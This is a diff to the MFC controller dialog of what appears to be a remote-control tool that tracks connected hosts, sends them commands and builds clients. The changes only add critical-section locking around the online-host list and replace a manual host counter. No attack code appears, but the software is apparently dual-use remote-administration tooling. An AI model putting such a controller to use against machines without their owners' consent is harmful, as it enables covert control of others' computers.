@@ -122,7 +122,6 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::I
 	m_bmOnline[0].LoadBitmap(IDB_BITMAP_ONLINE);
 	m_bmOnline[1].LoadBitmap(IDB_BITMAP_ONLINE);
 
-	m_iCount = 0;
 	InitializeCriticalSection(&m_cs);
 }
 
@@ -337,7 +336,6 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
 	m_CList_Online.SetItemText(i,ONLINELIST_PING,strPing); 
 
 	m_CList_Online.SetItemData(i,(DWORD_PTR)ContextObject);
-	m_iCount++;
 
 	ShowMessage(true,strIP+"主机上线");
 	LeaveCriticalSection(&m_cs);
@@ -356,7 +354,9 @@ VOID CMy2015RemoteDlg::ShowMessage(BOOL bOk, CString strMsg)
 
 	CString strStatusMsg;
 
-	m_iCount=(m_iCount<=0?0:m_iCount);         //防止iCount 有-1的情况
+	EnterCriticalSection(&m_cs);
+	int m_iCount = m_CList_Online.GetItemCount();
+	LeaveCriticalSection(&m_cs);
 
 	strStatusMsg.Format("有%d个主机在线",m_iCount);
 	m_StatusBar.SetPaneText(0,strStatusMsg);   //在状态条上显示文字
@@ -479,6 +479,7 @@ void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
 	{
 		return;
 	} 
+	EnterCriticalSection(&m_cs);
 	if (m_CList_Online.m_hWnd!=NULL)   //（控件也是窗口因此也有句柄）
 	{
 		CRect rc;
@@ -496,6 +497,7 @@ void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
 			m_CList_Online.SetColumnWidth(i,(lenth));       //设置当前的宽度
 		}
 	}
+	LeaveCriticalSection(&m_cs);
 
 	if (m_CList_Message.m_hWnd!=NULL)
 	{
@@ -549,12 +551,14 @@ void CMy2015RemoteDlg::OnClose()
 #endif
 
 	BYTE bToken = CLIENT_EXIT_WITH_SERVER ? COMMAND_BYE : SERVER_EXIT;
+	EnterCriticalSection(&m_cs);
 	int n = m_CList_Online.GetItemCount();
 	for(int Pos = 0; Pos < n; ++Pos) 
 	{
 		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(Pos);
 		m_iocpServer->OnClientPreSending(ContextObject, &bToken, sizeof(BYTE));
 	}
+	LeaveCriticalSection(&m_cs);
 	Sleep(200);
 
 	EnterCriticalSection(&m_cs);
@@ -608,7 +612,10 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
 	GetCursorPos(&Point);
 
 	int	iCount = SubMenu->GetMenuItemCount();
-	if (m_CList_Online.GetSelectedCount() == 0)         //如果没有选中
+	EnterCriticalSection(&m_cs);
+	int n = m_CList_Online.GetSelectedCount();
+	LeaveCriticalSection(&m_cs);
+	if (n == 0)         //如果没有选中
 	{ 
 		for (int i = 0;i<iCount;++i)
 		{
@@ -640,8 +647,8 @@ void CMy2015RemoteDlg::OnOnlineDelete()
 	BYTE bToken = COMMAND_BYE;   //向被控端发送一个COMMAND_SYSTEM
 	SendSelectedCommand(&bToken, sizeof(BYTE));   //Context     PreSending   PostSending
 
+	EnterCriticalSection(&m_cs);
 	int iCount = m_CList_Online.GetSelectedCount();
-
 	for (int i=0;i<iCount;++i)
 	{
 		POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
@@ -651,6 +658,7 @@ void CMy2015RemoteDlg::OnOnlineDelete()
 		strIP+="断开连接";
 		ShowMessage(true,strIP);
 	}
+	LeaveCriticalSection(&m_cs);
 }
 
 VOID CMy2015RemoteDlg::OnOnlineCmdManager()
@@ -728,6 +736,7 @@ void CMy2015RemoteDlg::OnOnlineBuildClient()
 
 VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
 {
+	EnterCriticalSection(&m_cs);
 	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
 	while(Pos)
 	{
@@ -737,6 +746,7 @@ VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
 		// 发送获得驱动器列表数据包
 		m_iocpServer->OnClientPreSending(ContextObject,szBuffer, ulLength);
 	} 
+	LeaveCriticalSection(&m_cs);
 }
 
 //真彩Bar
@@ -1022,7 +1032,6 @@ LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
 		{
 			ip = m_CList_Online.GetItemText(i, ONLINELIST_IP);
 			m_CList_Online.DeleteItem(i);
-			m_iCount--;
 			ShowMessage(true, ip + "主机下线");
 			break;
 		}
